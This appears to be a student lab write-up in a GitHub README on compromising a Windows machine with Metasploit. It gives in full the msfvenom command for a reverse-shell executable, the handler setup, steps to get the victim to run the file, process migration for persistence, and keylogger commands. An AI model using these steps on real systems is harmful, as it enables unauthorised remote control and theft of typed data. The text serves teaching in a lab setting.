# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:
<img width="645" height="459" alt="1" src="https://github.com/user-attachments/assets/751427f1-93ef-42b8-aa55-3bc370960772" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:
<img width="746" height="179" alt="2" src="https://github.com/user-attachments/assets/616f66a9-7c11-4bf1-acf2-9bcc5c0c2b69" />


copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="339" height="56" alt="3" src="https://github.com/user-attachments/assets/4f8f5872-b549-406c-b840-34cf885b12c2" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:
<img width="298" height="50" alt="4" src="https://github.com/user-attachments/assets/1baf60f8-5700-40bf-ba87-c6a41e97fbc8" />


Check the status of apache2
## OUTPUT:
<img width="809" height="371" alt="6" src="https://github.com/user-attachments/assets/705f54e2-9e30-4652-aadb-047648c6df1d" />



Invoke msfconsole:
## OUTPUT:
<img width="697" height="519" alt="7" src="https://github.com/user-attachments/assets/28e71575-ee64-46a4-82dc-379014b5883b" />




Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="680" height="468" alt="8" src="https://github.com/user-attachments/assets/a03e4f4a-6eaa-412c-a534-d50f1225042c" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:
<img width="648" height="134" alt="9" src="https://github.com/user-attachments/assets/e089c00e-1dd2-43c0-9c28-e12219aec759" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:



Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:
<img width="797" height="604" alt="11" src="https://github.com/user-attachments/assets/a4c97fe8-4db0-42d1-9336-745deecf1921" />



On kali/parrot give the command exploit
## OUTPUT:
<img width="507" height="86" alt="image" src="https://github.com/user-attachments/assets/34568d98-0fe8-4f64-9856-f9a3828e55dd" />


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:
<img width="856" height="498" alt="image" src="https://github.com/user-attachments/assets/88400847-5bc6-4222-ac14-ff8de3a99765" />



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:
<img width="893" height="188" alt="image" src="https://github.com/user-attachments/assets/f3efdafa-1eb9-439b-9da3-d96f66a122a9" />




keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:
<img width="559" height="142" alt="image" src="https://github.com/user-attachments/assets/feee941c-d2c2-48d5-83c2-2ba64f94e6bc" />


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
